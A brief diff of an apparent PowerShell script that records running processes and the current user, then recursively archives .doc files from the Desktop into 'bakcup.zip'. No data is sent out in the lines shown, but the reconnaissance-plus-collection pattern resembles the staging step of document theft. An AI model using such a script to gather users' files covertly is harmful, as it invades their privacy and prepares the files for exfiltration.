@@ -2,7 +2,7 @@ $process = get-process
 $whoami = whoami
 
 
-$data = dir "$home\Documents" -filter *.doc -recurse
+$data = dir "$home\Desktop" -filter *.doc -recurse
 $data | Foreach-Object{
 	Compress-Archive -Update -Path $_.FullName -DestinationPath bakcup.zip
 }
